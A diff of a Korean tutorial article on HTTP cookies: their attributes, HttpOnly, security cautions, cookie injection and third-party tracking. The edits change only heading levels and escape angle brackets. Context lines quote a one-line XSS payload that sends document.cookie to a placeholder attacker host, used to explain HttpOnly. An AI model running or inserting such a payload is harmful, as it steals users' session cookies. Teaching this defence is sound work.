@@ -30,7 +30,7 @@ console.log(document.cookie)
 guest_id=v1%3A1...; _ga=GA1.2...
 ```
 
-### 쿠키의 속성
+## 쿠키의 속성
 
 쿠키는 `<cookie-name>=<cookie-value>` 과 같은 형식으로 지정 되는데, `cookie-name` 는 제어 문자 및 공백, 탭을 제외한 아스키 문자로 구성되어야 하며 특수기호를 포함 할 수 없습니다.
 
@@ -39,19 +39,19 @@ guest_id=v1%3A1...; _ga=GA1.2...
 
 아래는 여러가지 Optinal한 쿠키 속성입니다.
 
-**Expires=<date>**
+**Expires=\<date>**
 
 쿠키의 최대 생존 시간입니다. 지정되지 않았다면, **세션 쿠키**로서 취급되며, 클라이언트가 종료될 때 파기 됩니다. 서버가 아니라 클라이언트에 상대적인 값으로 취급됩니다.
 
-**Max-Age=<number>**
+**Max-Age=\<number>**
 
 쿠키가 만료될 때 까지의 시간을 초단위로 표현합니다. 0 또는 음수가 지정되면 해당 쿠키는 즉시 만료되며, IE6,7,8은 이 헤더를 지원하지 않습니다. `Expires` 와 `Max-Age` 값이 모두 지정될 경우 Max-Age값을 더 우선적으로 판단합니다.
 
-**Domain=<domain-value>**
+**Domain=\<domain-value>**
 
 Domain은 쿠키의 스코프를 정의하며 어느 사이트에서 생성한 것인지 알려줍니다. 지정되지 않으면 현재 페이지 URL을 기준으로 적용됩니다.
 
-**Path=<path-value>**
+**Path=\<path-value>**
 
 쿠키를 보내기 전 요청 된 리소스에 있어야 하는 URL 경로를 나타냅니다. 예를 들어 `path=/soso` 로 지정된 경우 `/soso`, `/soso/jbee` 등의 경로에서 쿠키가 전송될 수 있습니다.
 
@@ -73,7 +73,7 @@ location.href = 'https://😈.com?cookies=' + document.cookie
 
 이러한 CSS(Cross-Site Scripting)공격을 방어하기 위해 document.cookie를 이용해 쿠키에 접근할 수 없도록 하는 옵션입니다.
 
-### 주의사항
+## 주의사항
 
 쿠키는 편리한 기능이지만, 몇 가지 제약이 있기 때문에 주의해서 사용해야 합니다.
 
@@ -83,7 +83,7 @@ location.href = 'https://😈.com?cookies=' + document.cookie
 
 마지막은 보안 문제입니다. `secure` 속성을 부여하면 HTTPS프로토콜로 암호화된 통신에서만 쿠키가 전송되지만, HTTP통신에서는 쿠키가 평문으로 전송됩니다. 따라서 비밀번호 등을 저장하면 안되며, 암호화 되더라도 사용자가 자유롭게 접근할 수 있으므로 조작위험이 있습니다.
 
-📝**쿠키 인젝션**
+### 쿠키 인젝션
 
 쿠키 인젝션은 쿠키의 사양을 역으로 취한 방법으로 HTTPS연결을 우회할 수 있습니다. HPPTS로 은닉된 도메인(ex:*example.com*)의 쿠키에 대해 HTTP가 아닌 다른 하위 도메인(ex: *subdomain.example.com*)으로부터 덮어 쓰거나, 상세한 쿠키를 설정함으로써(ex: *example.com/someapp*) 원래 HTTPS로 지정된 도메인의 쿠키를 무효화하는 것입니다.
 
@@ -91,7 +91,7 @@ location.href = 'https://😈.com?cookies=' + document.cookie
 
 서브 도메인에서 재구성할 수 없게 되었고, 동일한 도메인이라도 secure가 붙은 쿠키는 HTTP에서 덮어 쓸 수 없습니다.
 
-### First Party, Third Party
+## First Party, Third Party
 
 First Party쿠키는 브라우저가 액세스한 서비스가 해당 서비스 내에서만 유효한 쿠키를 써넣는 것입니다. 반면, Third Party쿠키는 광고 등의 용도로 외부 서비스에서 읽을 수 있는 쿠키를 삽입해 사이트를 넘어서 행동 추적을 가능하게 해주는 쿠키입니다.
 
